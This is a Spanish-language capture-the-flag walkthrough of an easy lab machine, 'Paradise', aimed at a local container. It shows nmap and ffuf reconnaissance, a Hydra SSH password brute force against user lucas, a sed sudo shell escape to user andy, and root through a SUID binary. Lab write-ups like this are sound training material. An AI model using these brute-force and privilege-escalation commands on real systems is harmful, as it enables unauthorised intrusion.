---
description: '🧠Dificultad: Fácil | 🔓18/03/2026'
---

# 🟩 Paradise

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`:

{% code overflow="wrap" %}
```bash
nmap -sC -sV -Pn $IPTARGET | tee nmap
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Vemos que el servidor está corriendo un servicio SSH, HTTP y SMB. Realizamos un escaneo de directorios al servicio web con `ffuf`.

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://$IPTARGET/FUZZ" -e .html,.php,.txt,.xml,.js
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

En el código html del  directorio `http://172.17.0.2/galery.html` encontramos un comentario con una cadena en base64.

{% code overflow="wrap" %}
```html
<!-- ZXN0b2VzdW5zZWNyZXRvCg== -->
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Si nos vamos al directorio `/estoesunsecreto`, encontramos lo siguiente:

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## 🚪 Ganando acceso

Hacemos fuerza bruta al usuario `lucas` usando `hydra`:

{% code overflow="wrap" %}
```bash
hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://$IPTARGET
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

La combinación es `lucas:chocolate`.

<figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Comprobamos los permisos que tenemos con `sudo`:

<figure><img src="../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

Podemos ejecutar `/bin/sed` como `andy` sin necesidad de introducir contraseña. En gtfobins encontramos una manera de aprovecharnos de esta configuración:

{% code overflow="wrap" %}
```bash
sudo -u andy sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

Una vez como `andy`, no podemos ver los permisos con sudo porque nos pide contraseña y no la sabemos, así que recurrimos a listar los binarios con el bit SUID activado.

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

Podemos ejecutar el binario `privileged_exec` como `root` (propietario), lo que nos da acceso a una shell con los máximos privilegios.

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>
